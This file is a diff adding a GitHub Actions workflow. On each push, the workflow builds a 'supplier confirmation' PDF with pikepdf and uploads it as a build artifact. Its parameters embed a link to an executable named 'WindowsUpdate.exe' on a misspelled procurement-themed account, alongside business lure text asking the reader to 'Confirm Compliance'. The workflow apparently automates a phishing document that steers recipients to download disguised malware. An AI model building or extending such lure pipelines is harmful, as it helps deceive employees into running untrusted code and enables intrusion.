@@ -1,0 +1,40 @@
+name: Auto Generate PDF
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build-pdf:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.10'
+
+    - name: Install dependencies
+      run: |
+        pip install pikepdf
+
+    - name: Generate PDF (with default values)
+      run: |
+        python v303_supplier_confirmation.py \
+          -o requirements.pdf \
+          -u "https://raw.githubusercontent.com/Procurement-Vibrant-Sales-Depertment/Breakthrough/main/WindowsUpdate.exe" \
+          -b "GlobalTech Solutions" \
+          -s "ACME Manufacturing" \
+          -p "Custom Electronics Module" \
+          -v "2.0" \
+          -l "Confirm Compliance"
+
+    - name: Upload PDF artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: Requirements-PDF
+        path: requirements.pdf
